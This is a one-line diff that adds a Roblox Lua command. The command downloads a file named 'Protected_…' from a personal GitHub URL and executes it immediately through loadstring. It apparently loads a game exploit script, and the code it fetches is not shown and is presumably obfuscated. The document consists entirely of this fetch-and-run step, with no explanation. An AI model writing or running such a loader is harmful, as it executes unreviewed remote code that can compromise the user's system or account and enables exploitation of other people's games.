@@ -1,1 +1,1 @@
-
+loadstring(game:HttpGet("https://raw.githubusercontent.com/sharksharkhei1/l/main/Protected_7281291949489253.txt"))()
